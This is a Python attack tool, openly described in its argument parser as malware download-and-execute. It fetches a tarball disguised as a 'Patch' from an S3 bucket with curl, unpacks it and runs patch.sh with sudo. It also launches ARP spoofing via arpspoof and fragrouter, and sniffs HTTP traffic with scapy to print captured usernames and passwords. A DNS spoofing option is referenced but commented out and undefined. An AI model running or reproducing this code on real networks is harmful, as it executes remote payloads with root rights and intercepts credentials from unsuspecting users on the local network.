import argparse
import os
import subprocess
import scapy.all as scapy
from scapy.layers import http
import optparse

def download_file(path, overwrite):
    malware_path = os.path.join(path, 'Patch.V.1.2')
    if os.path.exists(malware_path) and not overwrite:
        return
    os.system('curl -O "https://awss3project4821.s3.ap-southeast-2.amazonaws.com/Patch.V.1.2.tar"')
    subprocess.run(['tar', '-xvf', 'Patch.V.1.2.tar'], check=True)

def execute_file(path):
    malware_path = os.path.join(path, 'Patch.V.1.2')
    os.chdir(malware_path)
    execute_file_path = os.path.join(malware_path, "patch.sh")
    if os.path.exists(execute_file_path):
        subprocess.run(["sudo", "sh", execute_file_path], check=True)
    else:
        print(f"[-] There is no ExecuteFile: {execute_file_path}")

# def network_scan():
#     def scan(ip):
#         arp_request = scapy.ARP(pdst=ip)
#         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  
#         arp_request_broadcast = broadcast / arp_request 
#         answerd_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]
#         client_list = []
#         for element in answerd_list:
#             client_dict = {"ip":element[1].psrc, "mac":element[1].hwsrc}
#             client_list.append(client_dict)
#         return client_list
#     def print_scan_result(result_list):
#         print("IP\t\t\tMAC Address\n----------------------------------------------------------")
#         for client in result_list:
#             print(client["ip"] + "\t\t" + client["mac"])
#     ip_address = input("[-] Enter IP Address : ")
#     print_scan_result(scan(ip_address))


def spoof(interface, target_ip, spoof_ip, reverse):
    subprocess.Popen(['sudo', 'fragrouter', '-B1'],  stdout=subprocess.DEVNULL)
    if reverse:
        os.system(f'sudo arpspoof -i {interface} -t {target_ip} -r {spoof_ip}')
    else:
        os.system(f'sudo arpspoof -i {interface} -t {target_ip} {spoof_ip}')
    

def arp_spoof(interface, target, gateway, reverse):
    spoof(interface, gateway, target, reverse)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    print('a')
    print(packet)
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+]username/password >> " + login_info +
                  "\n\n")


def sniff(interface, filter):
    print('sniff funcv')
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def main():
    parser = argparse.ArgumentParser(description="Malware Software Download And Execute")
    parser.add_argument("--download", action="store_true", help="Malware Download")
    parser.add_argument("--execute" , action="store_true", help="Malware Execute")
    parser.add_argument("--overwrite", action="store_true", help="Malware Program Overwirte")
    parser.add_argument("--path", type=str, default=os.getcwd(), help="Malware Path")
    
    parser.add_argument("--scan", action="store_true", help="Network Scanning")
    parser.add_argument("--arp_spoof", action="store_true", help="ARP Spoof Mode")
    parser.add_argument("--reverse", action="store_true", help="Reverse Mode")
    parser.add_argument("--target", type=str, default="localhost", help="Target IP Address")
    parser.add_argument("--gateway", type=str, default="localhost", help="Gateway IP Address")

    parser.add_argument("--sniff", action="store_true", help="Network Sniffing")
    parser.add_argument("--interface", type=str, default="eth0", help="Interface")
    parser.add_argument("--filter", type=str, default="", help="pcap filter")

    parser.add_argument("--dns_spoof", action="store_true", help="DNS Spoof Mode")
    parser.add_argument("--url", type=str, default="kr.linkedin.com", help="Target Domain Name")
    
    args = parser.parse_args()
    if not os.path.exists(args.path):
        os.makedirs(args.path)
    if args.download:
        download_file(args.path, args.overwrite)
    if args.execute:
        execute_file(args.path)

    if args.arp_spoof:
        arp_spoof(args.interface, args.target, args.gateway, args.reverse)

    if args.sniff:
        sniff(args.interface, args.filter)

    # if args.scan:
    #     network_scan()
    
    # if args.dns_spoof:
    #     dns_spoof(args.url)

    
    # if not args.download and not args.execute:
    #     print("[-] must input --download or --execute")

if __name__ == "__main__":
    main()
